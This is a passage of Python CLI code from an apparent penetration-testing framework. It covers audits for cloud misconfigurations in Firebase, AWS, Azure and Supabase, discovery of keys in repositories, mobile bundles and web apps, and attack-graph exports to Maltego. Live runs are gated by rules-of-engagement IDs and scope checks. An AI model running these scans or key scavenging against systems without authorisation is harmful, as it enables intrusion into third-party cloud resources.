            max_workers=passive_max_workers,
        )
    console.print(f"[green]Passive findings ingested:[/green] {inserted}")


@vuln_app.command("verify")
def vuln_verify(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    vuln_id: str = typer.Option(..., "--id"),
) -> None:
    from forge.phase2.xray_runner import mark_vuln_verified  # noqa: PLC0415

    cfg = ForgeConfig.load()
    ok = mark_vuln_verified(cfg.engagement_db_path(engagement), vuln_id=vuln_id)
    if ok:
        console.print(f"[green]Marked verified:[/green] {vuln_id}")
    else:
        console.print(f"[yellow]No finding updated for:[/yellow] {vuln_id}")


@vuln_app.command("mark-fp")
def vuln_mark_fp(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    vuln_id: str = typer.Option(..., "--id"),
) -> None:
    from forge.phase2.xray_runner import mark_vuln_false_positive  # noqa: PLC0415

    cfg = ForgeConfig.load()
    ok = mark_vuln_false_positive(cfg.engagement_db_path(engagement), vuln_id=vuln_id)
    if ok:
        console.print(f"[green]Marked false positive:[/green] {vuln_id}")
    else:
        console.print(f"[yellow]No finding updated for:[/yellow] {vuln_id}")


@vuln_app.command("summary")
def vuln_summary(
    engagement: str = typer.Option(..., "--engagement", "-e"),
) -> None:
    from forge.phase2.xray_runner import summarize_passive_vulns  # noqa: PLC0415

    cfg = ForgeConfig.load()
    summary = summarize_passive_vulns(int(engagement), cfg.engagement_db_path(engagement))
    console.print("[bold]Passive Vulnerability Summary[/bold]")
    for severity in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
        console.print(f"{severity:8} {summary.get(severity, 0)}")


# ---------------------------------------------------------------------------
# Phase 4 — Cloud Misconfiguration Scanning (cloud sub-app)
# ---------------------------------------------------------------------------


@cloud_app.command("firebase")
def cloud_firebase(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    project_id: str = typer.Option(..., "--project-id", "--project-ref", help="Firebase project ID."),
    api_key: Optional[str] = typer.Option(
        None,
        "--api-key",
        envvar="FORGE_FIREBASE_API_KEY",
        help="Firebase web API key. If omitted, auto-fill discovery is used.",
    ),
    auto_discover_web: Optional[bool] = typer.Option(
        None,
        "--auto-discover-web/--no-auto-discover-web",
        help="Enable Firebase web endpoint key discovery.",
    ),
    scavenge_repos: Optional[bool] = typer.Option(
        None,
        "--scavenge-repos/--no-scavenge-repos",
        help="Enable repository scavenging for Firebase keys.",
    ),
    tests: str = typer.Option(
        "all",
        "--tests",
        help="Comma-separated test modules: auth,database,firestore,storage,functions,all",
    ),
    timeout: int = typer.Option(600, "--timeout", help="Subprocess kill timeout in seconds."),
    dry_run: bool = typer.Option(False, "--dry-run"),
    roe_id: Optional[str] = typer.Option(
        None,
        "--roe-id",
        envvar="FORGE_ROE_ID",
        help="ROE identifier required before direct live Firebase audits.",
    ),
    scope_manifest: Optional[str] = typer.Option(
        None,
        "--scope-manifest",
        help="Scope manifest path/JSON for direct Firebase audit gating.",
    ),
) -> None:
    """Audit a Firebase project via Agneyastra (Module 4-E). Requires agneyastra >= 1.0.0 on PATH.

    OPSEC: Active testing against live Firebase endpoints. Requires explicit
    engagement authorisation covering Firebase/GCP resources.
    """
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.phase4.cloud_audit import FirebaseAuditor  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    scope_values: list[str] = []
    url_prefixes: list[str] = []
    if not dry_run:
        _direct_cli_require_roe(roe_id, command_name="cloud firebase")
        scope_values, url_prefixes = _direct_cli_load_scope_lists(
            engagement_id=int(engagement),
            db_path=db_path,
            scope_manifest=scope_manifest,
            target=f"https://{project_id}.firebaseapp.com",
            seed_type="url",
        )
    test_list = [t.strip() for t in tests.split(",")]
    auditor = FirebaseAuditor(db_path=db_path, engagement_id=int(engagement))
    auditor.run(
        project_id=project_id,
        tests=test_list,
        api_key=api_key,
        auto_discover_web=(
            cfg.firebase_web_discovery if auto_discover_web is None else auto_discover_web
        ),
        repo_scavenge=(cfg.firebase_repo_scavenge if scavenge_repos is None else scavenge_repos),
        timeout=timeout,
        dry_run=dry_run,
        scope_values=scope_values,
        url_prefixes=url_prefixes,
        require_scope=not dry_run,
    )


@cloud_app.command("aws")
def cloud_aws(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    profile: Optional[str] = typer.Option(
        None,
        "--profile",
        help="AWS profile to use for authentication.",
    ),
    regions: Optional[str] = typer.Option(
        None,
        "--regions",
        help="Comma-separated AWS regions to audit (default: all available regions).",
    ),
    services: str = typer.Option(
        "all",
        "--services",
        help="Comma-separated AWS services to audit: iam,s3,rds,ec2,lambda,cloudtrail (default: all).",
    ),
    dry_run: bool = typer.Option(False, "--dry-run", help="Preview planned audit without API calls."),
    output_format: str = typer.Option(
        "json",
        "--output-format",
        help="Output format: json, csv, sarif.",
    ),
    output_path: Optional[str] = typer.Option(
        None,
        "--output",
        help="Optional output file path. Defaults under engagement artifacts.",
    ),
    timeout: int = typer.Option(600, "--timeout", help="Maximum execution time in seconds."),
    roe_id: Optional[str] = typer.Option(
        None,
        "--roe-id",
        envvar="FORGE_ROE_ID",
        help="ROE identifier required before direct live AWS audits.",
    ),
    yes: bool = typer.Option(
        False,
        "--yes",
        help="Skip the interactive confirmation after --roe-id; intended for kill-chain auto-run.",
    ),
) -> None:
    """Comprehensive AWS security audit (IAM, S3, RDS, EC2, Lambda, CloudTrail)."""
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.phase4.aws_audit import run_aws_audit  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    output_format = _normalise_output_format(output_format)
    profile_value = profile or cfg.cloud_aws_profile
    regions_value = regions
    if not regions_value and cfg.cloud_aws_regions:
        regions_value = ",".join(cfg.cloud_aws_regions)
    services_value = services
    if services == "all" and cfg.cloud_aws_services:
        services_value = ",".join(cfg.cloud_aws_services)
    regions_list = [item.strip() for item in regions_value.split(",") if item.strip()] if regions_value else None
    services_list = (
        [item.strip() for item in services_value.split(",") if item.strip()]
        if services_value != "all"
        else None
    )
    
    console.print(f"[bold blue]AWS Security Audit[/bold blue]")
    console.print(f"  Engagement: {engagement}")
    console.print(f"  Profile: {profile_value or 'default'}")
    console.print(f"  Regions: {regions_value or 'all'}")
    console.print(f"  Services: {services_value}")
    console.print(f"  Dry run: {dry_run}")
    console.print(f"  Output: {output_format}")
    yes = yes if isinstance(yes, bool) else False
    if not dry_run:
        _direct_cli_require_roe(roe_id, command_name="cloud aws")
        if not yes:
            import questionary  # noqa: PLC0415

            proceed = questionary.confirm(
                "Run AWS audit against live APIs for this engagement?"
            ).ask()
            if not proceed:
                raise typer.Exit()
    
    try:
        findings = run_aws_audit(
            db_path=db_path,
            engagement_id=int(engagement),
            profile=profile_value,
            regions=regions_list,
            services=services_list,
            dry_run=dry_run,
            timeout=timeout,
        )
        findings_payload = [finding.to_dict() for finding in findings]
        default_ext = "sarif" if output_format == "sarif" else output_format
        output_target = (
            Path(output_path)
            if output_path
            else (cfg.data_dir / "engagements" / str(engagement) / "reports" / f"aws_audit.{default_ext}")
        )
        _write_cloud_output(
            findings=findings_payload,
            provider="aws",
            output_format=output_format,
            output_path=output_target,
        )
        console.print(f"[green]✓ AWS audit completed: {len(findings)} findings[/green]")
        console.print(f"[green]✓ Output written:[/green] {output_target}")
        
    except Exception as exc:
        console.print(f"[red]✗ AWS audit failed: {exc}[/red]")
        raise typer.Exit(1)


@cloud_app.command("azure")
def cloud_azure(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    subscription_id: Optional[str] = typer.Option(
        None,
        "--subscription-id",
        help="Azure subscription ID (default: first available).",
    ),
    tenant_id: Optional[str] = typer.Option(
        None,
        "--tenant-id",
        help="Azure tenant ID for service principal authentication.",
    ),
    client_id: Optional[str] = typer.Option(
        None,
        "--client-id",
        help="Service principal client ID for authentication.",
    ),
    client_secret: Optional[str] = typer.Option(
        None,
        "--client-secret",
        envvar="FORGE_AZURE_CLIENT_SECRET",
        help="Service principal client secret for authentication.",
    ),
    services: str = typer.Option(
        "all",
        "--services",
        help="Comma-separated Azure services to audit: rbac,storage,sql,keyvault,appservice (default: all).",
    ),
    dry_run: bool = typer.Option(False, "--dry-run", help="Preview planned audit without API calls."),
    output_format: str = typer.Option(
        "json",
        "--output-format",
        help="Output format: json, csv, sarif.",
    ),
    output_path: Optional[str] = typer.Option(
        None,
        "--output",
        help="Optional output file path. Defaults under engagement artifacts.",
    ),
    timeout: int = typer.Option(600, "--timeout", help="Maximum execution time in seconds."),
    roe_id: Optional[str] = typer.Option(
        None,
        "--roe-id",
        envvar="FORGE_ROE_ID",
        help="ROE identifier required before direct live Azure audits.",
    ),
    yes: bool = typer.Option(
        False,
        "--yes",
        help="Skip the interactive confirmation after --roe-id; intended for kill-chain auto-run.",
    ),
) -> None:
    """Comprehensive Azure security audit (RBAC, Storage, SQL, Key Vault, App Service)."""
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.phase4.azure_audit import run_azure_audit  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    output_format = _normalise_output_format(output_format)
    subscription_value = subscription_id or cfg.cloud_azure_subscription_id
    tenant_value = tenant_id or cfg.cloud_azure_tenant_id
    client_value = client_id or cfg.cloud_azure_client_id
    services_value = services
    if services == "all" and cfg.cloud_azure_services:
        services_value = ",".join(cfg.cloud_azure_services)
    services_list = (
        [item.strip() for item in services_value.split(",") if item.strip()]
        if services_value != "all"
        else None
    )
    
    console.print(f"[bold blue]Azure Security Audit[/bold blue]")
    console.print(f"  Engagement: {engagement}")
    console.print(f"  Subscription: {subscription_value or 'auto-detect'}")
    console.print(f"  Services: {services_value}")
    console.print(f"  Dry run: {dry_run}")
    console.print(f"  Output: {output_format}")
    yes = yes if isinstance(yes, bool) else False
    if not dry_run:
        _direct_cli_require_roe(roe_id, command_name="cloud azure")
        if not yes:
            import questionary  # noqa: PLC0415

            proceed = questionary.confirm(
                "Run Azure audit against live APIs for this engagement?"
            ).ask()
            if not proceed:
                raise typer.Exit()
    
    try:
        findings = run_azure_audit(
            db_path=db_path,
            engagement_id=int(engagement),
            subscription_id=subscription_value,
            tenant_id=tenant_value,
            client_id=client_value,
            client_secret=client_secret,
            services=services_list,
            dry_run=dry_run,
            timeout=timeout,
        )
        findings_payload = [finding.to_dict() for finding in findings]
        default_ext = "sarif" if output_format == "sarif" else output_format
        output_target = (
            Path(output_path)
            if output_path
            else (cfg.data_dir / "engagements" / str(engagement) / "reports" / f"azure_audit.{default_ext}")
        )
        _write_cloud_output(
            findings=findings_payload,
            provider="azure",
            output_format=output_format,
            output_path=output_target,
        )
        console.print(f"[green]✓ Azure audit completed: {len(findings)} findings[/green]")
        console.print(f"[green]✓ Output written:[/green] {output_target}")
        
    except Exception as exc:
        console.print(f"[red]✗ Azure audit failed: {exc}[/red]")
        raise typer.Exit(1)


@cloud_app.command("firebase-extract")
def cloud_firebase_extract(
    engagement: Optional[str] = typer.Option(None, "--engagement", "-e"),
    apk: Optional[str] = typer.Option(None, "--apk", help="Path to Android APK, AAB, XAPK, APKM, or APKS file."),
    ipa: Optional[str] = typer.Option(None, "--ipa", help="Path to iOS IPA file."),
    target_url: Optional[str] = typer.Option(
        None, "--target-url", "-u",
        help="Web app URL to crawl for embedded Firebase config (auto-discovery).",
    ),
    output_json: Optional[str] = typer.Option(
        None,
        "--output-json",
        help="Write extracted config to JSON file.",
    ),
    dry_run: bool = typer.Option(False, "--dry-run"),
    scope_manifest: Optional[str] = typer.Option(
        None,
        "--scope-manifest",
        help="Scope manifest path/JSON for direct web Firebase extraction gating.",
    ),
) -> None:
    """Extract Firebase config from APK/AAB/XAPK/APKM/APKS/IPA bundles OR web app auto-discovery (Module 4-F).

    --apk / --ipa: Offline decompile of mobile bundle to find google-services.json.
    --target-url:  Crawl target web app JS/HTML to auto-extract embedded firebaseConfig.
                   No Firebase keys needed — discovers them FROM the target app.
    """
    from pathlib import Path as _Path  # noqa: PLC0415
    import sqlite3 as _sqlite3  # noqa: PLC0415

    from forge.config import ForgeConfig  # noqa: PLC0415

    if not apk and not ipa and not target_url:
        console.print("[bold red]ERROR:[/bold red] Provide --apk, --ipa, or --target-url.")
        raise typer.Exit(code=1)

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement) if engagement else None

    # --- Web auto-discovery (new) ---
    if target_url:
        from forge.phase4.firebase_extract import extract_firebase_config  # noqa: PLC0415
        if not dry_run and not engagement:
            raise typer.BadParameter("--engagement is required for live --target-url extraction.")
        if engagement and db_path:
            scope_values, url_prefixes = _direct_cli_load_scope_lists(
                engagement_id=int(engagement),
                db_path=db_path,
                scope_manifest=scope_manifest,
                target=target_url,
                seed_type="url",
            )
            scope = [*scope_values, *url_prefixes]
        else:
            scope = [target_url.split("//")[-1].split("/")[0]]
        conn = _sqlite3.connect(str(db_path)) if db_path else _sqlite3.connect(":memory:")
        conn.row_factory = _sqlite3.Row
        found = extract_firebase_config(
            engagement_id=int(engagement) if engagement else 0,
            engagement_scope=scope,
            target_url=target_url,
            eng_db_conn=conn,
            cfg=cfg,
            dry_run=dry_run,
        )
        conn.commit(); conn.close()
        if not found:
            console.print("[yellow]No Firebase config found in web app.[/yellow]")
        for c in found:
            console.print(f"  [green]Found:[/green] project_id={c.get('project_id')}  api_key={str(c.get('api_key',''))[:12]}...")
            console.print(f"  [dim]→ forge cloud firebase --project-id {c.get('project_id')}[/dim]")
        if output_json and found:
            import json as _json
            _Path(output_json).write_text(_json.dumps(found, indent=2))
            console.print(f"JSON written to {output_json}")
        return

    # --- Mobile bundle extraction (existing) ---
    from forge.phase4.mobile_config_parse import FirebaseExtractor  # noqa: PLC0415
    extractor = FirebaseExtractor(age_pubkey=None)
    projects = []
    supabase_configs = []
    if apk:
        projects.extend(extractor.extract_apk(_Path(apk)))
        supabase_configs.extend(extractor.extract_supabase_apk(_Path(apk)))
    if ipa:
        projects.extend(extractor.extract_ipa(_Path(ipa)))
        supabase_configs.extend(extractor.extract_supabase_ipa(_Path(ipa)))

    if not projects and not supabase_configs:
        console.print("[yellow]No Firebase or Supabase mobile config found.[/yellow]")
        return

    for p in projects:
        console.print(f"  [green]Firebase:[/green] {p.project_id}  (source: {p.source_file})")
        console.print(f"  [dim]→ forge cloud firebase --project-id {p.project_id}[/dim]")
    for config in supabase_configs:
        console.print(f"  [green]Supabase:[/green] {config.project_ref}  (source: {config.source_file})")
        console.print(f"  [dim]→ forge cloud supabase --engagement {engagement or '-'} --project-ref {config.project_ref}[/dim]")

    if engagement and db_path:
        written = extractor.store(projects, db_path, engagement_id=int(engagement))
        supabase_written = extractor.store_supabase_configs(
            supabase_configs,
            db_path,
            engagement_id=int(engagement),
        )
        console.print(f"Stored {written} Firebase project(s) and {supabase_written} Supabase config(s) in engagement evidence.")

    if output_json:
        if supabase_configs:
            extractor.emit_mobile_config_json(projects, supabase_configs, _Path(output_json))
        else:
            extractor.emit_json(projects, _Path(output_json))
        console.print(f"JSON written to {output_json}")


@cloud_app.command("supabase")
def cloud_supabase(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    project_ref: Optional[str] = typer.Option(
        None,
        "--project-ref",
        help="Supabase project reference ID (e.g. xyzxyzxyz).",
    ),
    url: Optional[str] = typer.Option(
        None,
        "--url",
        help="Full Supabase base URL (alternative to --project-ref).",
    ),
    anon_key: Optional[str] = typer.Option(
        None,
        "--anon-key",
        envvar="FORGE_SUPABASE_ANON_KEY",
        help="Supabase anonymous public key (apikey header). Supports comma-separated key rotation.",
    ),
    auth_token: Optional[str] = typer.Option(
        None,
        "--auth-token",
        help="Authenticated JWT to test differential access.",
    ),
    auto_discover: Optional[bool] = typer.Option(
        None,
        "--auto-discover/--no-auto-discover",
        help="Enable in-scope Supabase anon key discovery from live endpoints.",
    ),
    mobile_extract: Optional[bool] = typer.Option(
        None,
        "--mobile-extract/--no-mobile-extract",
        help="Enable mobile-config Supabase key extraction fallback.",
    ),
    repo_scavenge: Optional[bool] = typer.Option(
        None,
        "--repo-scavenge/--no-repo-scavenge",
        help="Enable repository scavenging for Supabase keys.",
    ),
    dry_run: bool = typer.Option(False, "--dry-run"),
    roe_id: Optional[str] = typer.Option(
        None,
        "--roe-id",
        envvar="FORGE_ROE_ID",
        help="ROE identifier required before direct live Supabase scans.",
    ),
    scope_manifest: Optional[str] = typer.Option(
        None,
        "--scope-manifest",
        help="Scope manifest path/JSON for direct Supabase scan gating.",
    ),
) -> None:
    """Test Supabase RLS policy misconfigurations via anonymous REST probing (Module 4-G).

    OPSEC: Active testing against live Supabase REST API. Write probes use a
    recognisable payload (__forge_probe__) — run `forge clean` after testing
    to document the probe record for the client's cleanup checklist.
    """
    if not project_ref and not url:
        console.print("[bold red]ERROR:[/bold red] Provide --project-ref or --url.")
        raise typer.Exit(code=1)

    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.phase4.api_policy_check import SupabaseScanner  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    scope_values: list[str] = []
    url_prefixes: list[str] = []
    if not dry_run:
        _direct_cli_require_roe(roe_id, command_name="cloud supabase")
        supabase_target = (url or "").strip() or f"https://{project_ref}.supabase.co"
        scope_values, url_prefixes = _direct_cli_load_scope_lists(
            engagement_id=int(engagement),
            db_path=db_path,
            scope_manifest=scope_manifest,
            target=supabase_target,
            seed_type="url",
        )
    scanner = SupabaseScanner(db_path=db_path, engagement_id=int(engagement))
    scanner.scan(
        project_ref=project_ref or "",
        base_url=url,
        anon_key=anon_key,
        auth_token=auth_token,
        auto_discover=(cfg.supabase_auto_discovery if auto_discover is None else auto_discover),
        mobile_extract=(cfg.mobile_assets_scan if mobile_extract is None else mobile_extract),
        repo_scavenge=(cfg.repo_key_scavenge if repo_scavenge is None else repo_scavenge),
        dry_run=dry_run,
        scope_values=scope_values,
        url_prefixes=url_prefixes,
        require_scope=not dry_run,
    )


# ---------------------------------------------------------------------------
# Phase 4 — Attack Path Visualization (graph sub-app)
# ---------------------------------------------------------------------------


@graph_app.command("build")
def graph_build(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    fmt: str = typer.Option(
        "json",
        "--format",
        help="Output format: mermaid | dot | json | maltego | all",
    ),
    output_dir: Optional[str] = typer.Option(
        None,
        "--output-dir",
        "-o",
        help="Directory to write output files (default: current directory).",
    ),
    min_severity: str = typer.Option(
        "LOW",
        "--min-severity",
        help="Exclude findings below this threshold: CRITICAL | HIGH | MEDIUM | LOW",
    ),
    critical_path_only: bool = typer.Option(
        False,
        "--critical-path-only",
        help="Emit only nodes and edges on the critical attack path.",
    ),
    snapshot: bool = typer.Option(
        False,
        "--snapshot",
        help="Write the graph to attack_graph_snapshots table for Phase 6 consumption.",
    ),
    max_nodes: int = typer.Option(
        150,
        "--max-nodes",
        help="Auto-prune low-severity leaf nodes if graph exceeds this count.",
    ),
) -> None:
    """Build a directed attack graph from all Phase 4 findings (Module 4-H).

    Reads engagement DB (read-only). Emits Mermaid flowchart, Graphviz DOT,
    structured JSON, GraphML import artifacts, and native Maltego `.mtgx`
    workspace archives. No network access at any point.
    """
    import json as _json  # noqa: PLC0415
    import re as _re  # noqa: PLC0415
    import xml.sax.saxutils as _xs  # noqa: PLC0415
    import zipfile as _zipfile  # noqa: PLC0415
    from pathlib import Path as _Path  # noqa: PLC0415
    from xml.etree import ElementTree as _ElementTree  # noqa: PLC0415

    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.models.attack_graph_models import OutputFormat, Severity  # noqa: PLC0415
    from forge.phase4.attack_path import (  # noqa: PLC0415
        AttackGraphBuilder,
        DotRenderer,
        MermaidRenderer,
    )

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    out_dir = _Path(output_dir) if output_dir else _Path(".")
    out_dir.mkdir(parents=True, exist_ok=True)

    builder = AttackGraphBuilder(
        engagement_id=int(engagement),
        db_path=db_path,
        min_severity=Severity(min_severity.upper()),
        max_nodes=max_nodes,
    )
    graph = builder.build()

    if critical_path_only:
        cp_ids = set(graph.critical_path_nodes)
        graph.nodes[:] = [n for n in graph.nodes if n.node_id in cp_ids]
        graph.edges[:] = [
            e for e in graph.edges if e.source_node_id in cp_ids and e.target_node_id in cp_ids
        ]

    requested = OutputFormat(fmt.lower())
    stem = f"{engagement}_attack_graph"

    def _node_type_text(node) -> str:
        raw = node.node_type.value if hasattr(node.node_type, "value") else str(node.node_type)
        return str(raw or "UNKNOWN").strip().upper() or "UNKNOWN"

    def _severity_text(node) -> str:
        raw = node.severity.value if node.severity and hasattr(node.severity, "value") else node.severity
        return str(raw or "").strip().upper()

    def _edge_relation(edge) -> str:
        label = str(getattr(edge, "label", "") or "").strip()
        if label:
            return label
        return str(getattr(edge, "edge_type", "") or "").strip()

    def _node_metadata_for_export(node) -> dict[str, object]:
        raw_metadata = getattr(node, "metadata", {}) or {}
        if not isinstance(raw_metadata, dict):
            return {}
        try:
            return _json.loads(
                _json.dumps(raw_metadata, sort_keys=True, default=str)
            )
        except Exception:
            return {
                str(key): str(value)
                for key, value in sorted(raw_metadata.items(), key=lambda item: str(item[0]))
            }

    def _node_metadata_text(node) -> str:
        return _json.dumps(
            _node_metadata_for_export(node),
            ensure_ascii=False,
            separators=(",", ":"),
            sort_keys=True,
        )

    def _node_analyst_properties(node) -> dict[str, str]:
        metadata = _node_metadata_for_export(node)
        ordered_keys = (
            "service",
            "identifier",
            "validation_status",
            "validation_method",
            "validation_state",
            "validation_detail",
            "validated_at",
            "source_backend",
            "source_url",
            "repo_name",
            "domain",
            "pattern_name",
            "cloud_provider",
            "resource_id",
            "vuln_type",
        )
        properties: dict[str, str] = {}
        for key in ordered_keys:
            value = metadata.get(key)
            if value is None:
                continue
            text = str(value).strip()
            if not text:
                continue
            properties[key] = text[:512]
        return properties

    def _edge_metadata_for_export(edge) -> dict[str, object]:
        raw_metadata = getattr(edge, "metadata", {}) or {}
        if not isinstance(raw_metadata, dict):
            return {}
        try:
            return _json.loads(
                _json.dumps(raw_metadata, sort_keys=True, default=str)
            )
        except Exception:
            return {
                str(key): str(value)
                for key, value in sorted(raw_metadata.items(), key=lambda item: str(item[0]))
            }

    def _edge_metadata_text(edge) -> str:
        return _json.dumps(
            _edge_metadata_for_export(edge),
            ensure_ascii=False,
            separators=(",", ":"),
            sort_keys=True,
        )

    def _domain_like(value: str) -> bool:
        return bool(_re.fullmatch(r"[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+", value))

    def _phone_like(value: str) -> bool:
        digits = "".join(ch for ch in value if ch.isdigit())
        return len(digits) >= 7 and bool(_re.fullmatch(r"[+()0-9 .-]+", value))

    def _primary_entity_type(node) -> tuple[str, str, str]:
        import ipaddress as _ipaddress  # noqa: PLC0415

        label = str(node.label or node.node_id or "").strip()
        node_type = _node_type_text(node)
        metadata = _node_metadata_for_export(node)
        if node_type == "CLOUD":
            identifier = str(metadata.get("identifier") or "").strip()
            if identifier:
                label = identifier
        if node_type == "EXTERNAL" and " " in label and any(
            token in label.lower() for token in ("corp", "inc", "llc", "ltd", "company", "organization")
        ):
            return "maltego.Company", "company.name", label
        if "@" in label and " " not in label:
            return "maltego.EmailAddress", "email", label
        if label.lower().startswith(("http://", "https://")):
            return "maltego.URL", "short-title", label
        try:
            parsed_ip = _ipaddress.ip_address(label)
            if parsed_ip.version == 4:
                return "maltego.IPv4Address", "ipv4-address", label
        except ValueError:
            pass
        if node_type in {"HOST", "CLOUD"} and _domain_like(label.lower()):
            return "maltego.Domain", "fqdn", label.lower()
        if node_type == "EXTERNAL" and " " in label:
            return "maltego.Person", "person.fullname", label
        if _phone_like(label):
            return "maltego.PhoneNumber", "phone-number", label
        return "maltego.Alias", "alias", label

    def _layout_positions() -> dict[str, tuple[float, float]]:
        ordered_types = (
            "EXTERNAL",
            "HOST",
            "CLOUD",
            "CREDENTIAL",
            "APIKEY",
            "VULN",
            "EXPLOIT",
            "IMPACT",
            "UNKNOWN",
        )
        groups: dict[str, list[Any]] = {kind: [] for kind in ordered_types}
        for node in graph.nodes:
            groups.setdefault(_node_type_text(node), []).append(node)
        positions: dict[str, tuple[float, float]] = {}
        x_base = 120.0
        x_step = 220.0
        y_base = 120.0
        y_step = 120.0
        for column, kind in enumerate(list(ordered_types) + [kind for kind in groups if kind not in ordered_types]):
            nodes_for_kind = groups.get(kind, [])
            if not nodes_for_kind:
                continue
            for row_index, node in enumerate(nodes_for_kind):
                positions[str(node.node_id)] = (
                    x_base + column * x_step,
                    y_base + row_index * y_step,
                )
        return positions

    def _count_by(values: Iterable[str]) -> dict[str, int]:
        counts: dict[str, int] = {}
        for raw in values:
            key = str(raw or "UNKNOWN").strip() or "UNKNOWN"
            counts[key] = counts.get(key, 0) + 1
        return dict(sorted(counts.items(), key=lambda item: item[0]))

    def _mtgx_manifest_payload() -> dict[str, object]:
        positions = _layout_positions()
        node_manifest: list[dict[str, object]] = []
        for node in graph.nodes:
            entity_type, primary_property, primary_value = _primary_entity_type(node)
            x, y = positions.get(str(node.node_id), (0.0, 0.0))
            node_manifest.append(
                {
                    "node_id": str(node.node_id),
                    "label": str(node.label or ""),
                    "forge_node_type": _node_type_text(node),
                    "maltego_entity_type": entity_type,
                    "primary_property": primary_property,
                    "primary_value": primary_value,
                    "severity": _severity_text(node),
                    "source_table": str(node.source_table or ""),
                    "source_id": int(node.source_id or 0),
                    "metadata": _node_metadata_for_export(node),
                    "analyst_properties": _node_analyst_properties(node),
                    "on_critical_path": bool(node.on_critical_path),
                    "layout": {"x": round(float(x), 1), "y": round(float(y), 1)},
                }
            )
        edge_manifest: list[dict[str, object]] = []
        for edge in graph.edges:
            edge_manifest.append(
                {
                    "source_node_id": str(edge.source_node_id),
                    "target_node_id": str(edge.target_node_id),
                    "relation": _edge_relation(edge),
                    "edge_type": str(getattr(edge, "edge_type", "") or ""),
                    "weight": float(getattr(edge, "weight", 1.0)),
                    "metadata": _edge_metadata_for_export(edge),
                    "on_critical_path": bool(getattr(edge, "on_critical_path", False)),
                }
            )

        return {
            "schema": "forge.mtgx.manifest.v1",
            "generated_at": str(graph.generated_at or ""),
            "engagement_id": int(graph.engagement_id),
            "engagement_name": str(graph.engagement_name or ""),
            "node_count": int(graph.node_count),
            "edge_count": int(graph.edge_count),
            "critical_path_node_count": len(graph.critical_path_nodes),
            "critical_path_weight": float(graph.critical_path_weight),
            "min_severity_filter": (
                graph.min_severity_filter.value
                if hasattr(graph.min_severity_filter, "value")
                else str(graph.min_severity_filter)
            ),
            "pruned": bool(graph.pruned),
            "prune_reason": graph.prune_reason,
            "node_type_counts": _count_by(_node_type_text(node) for node in graph.nodes),
            "severity_counts": _count_by(_severity_text(node) or "NONE" for node in graph.nodes),
            "layout_strategy": "deterministic_columnar_by_forge_node_type",
            "maltego_type_mapping": {
                "email_label": "maltego.EmailAddress",
                "url_label": "maltego.URL",
                "ip_label": "maltego.IPv4Address",
                "domain_host_or_cloud": "maltego.Domain",
                "person_external": "maltego.Person",
                "company_external": "maltego.Company",
                "phone_label": "maltego.PhoneNumber",
                "fallback": "maltego.Alias",
            },
            "nodes": node_manifest,
            "edges": edge_manifest,
            "safety_notes": [
                "FORGE graph exports are generated from persisted engagement evidence only.",
                "Sensitive plaintext credential fields are excluded by the graph exporter guard.",
                "Critical-path flags are deterministic graph annotations, not LLM output.",
            ],
        }

    def _mtgx_readme_text(manifest: dict[str, object]) -> str:
        node_type_counts = manifest.get("node_type_counts") or {}
        severity_counts = manifest.get("severity_counts") or {}
        lines = [
            "# FORGE Maltego Workspace",
            "",
            f"Engagement: {manifest.get('engagement_name') or manifest.get('engagement_id')}",
            f"Generated: {manifest.get('generated_at') or '-'}",
            f"Nodes: {manifest.get('node_count')}  Edges: {manifest.get('edge_count')}",
            f"Critical path nodes: {manifest.get('critical_path_node_count')}",
            f"Layout: {manifest.get('layout_strategy')}",
            "",
            "## Files",
            "",
            "- Graphs/Graph1.graphml: native Maltego graph workspace payload.",
            "- manifest.json: deterministic FORGE graph/export metadata and node mapping.",
            "- README.md: analyst quick-reference for this archive.",
            "",
            "## Node Types",
            "",
        ]
        if isinstance(node_type_counts, dict) and node_type_counts:
            lines.extend(f"- {key}: {value}" for key, value in sorted(node_type_counts.items()))
        else:
            lines.append("- none")
        lines.extend(["", "## Severities", ""])
        if isinstance(severity_counts, dict) and severity_counts:
            lines.extend(f"- {key}: {value}" for key, value in sorted(severity_counts.items()))
        else:
            lines.append("- none")
        lines.extend(
            [
                "",
                "## Analyst Notes",
                "",
                "- FORGE properties are stored on each Maltego entity under forge.* names.",
                "- The forge.node_type, forge.severity, and forge.on_critical_path fields are the primary filters.",
                "- Risk/severity values are produced by deterministic rule engines, not by LLM report text.",
            ]
        )
        return "\n".join(lines).rstrip() + "\n"

    def _generic_graphml() -> str:
        positions = _layout_positions()
        lines = [
            '<?xml version="1.0" encoding="UTF-8"?>',
            '<graphml xmlns="http://graphml.graphdrawing.org/xmlns">',
            '  <key id="label" for="node" attr.name="label" attr.type="string"/>',
            '  <key id="entity_type" for="node" attr.name="entity_type" attr.type="string"/>',
            '  <key id="maltego_entity_type" for="node" attr.name="maltego_entity_type" attr.type="string"/>',
            '  <key id="primary_property" for="node" attr.name="primary_property" attr.type="string"/>',
            '  <key id="primary_value" for="node" attr.name="primary_value" attr.type="string"/>',
            '  <key id="severity" for="node" attr.name="severity" attr.type="string"/>',
            '  <key id="critical" for="node" attr.name="critical" attr.type="string"/>',
            '  <key id="source_table" for="node" attr.name="source_table" attr.type="string"/>',
            '  <key id="source_id" for="node" attr.name="source_id" attr.type="int"/>',
            '  <key id="metadata_json" for="node" attr.name="metadata_json" attr.type="string"/>',
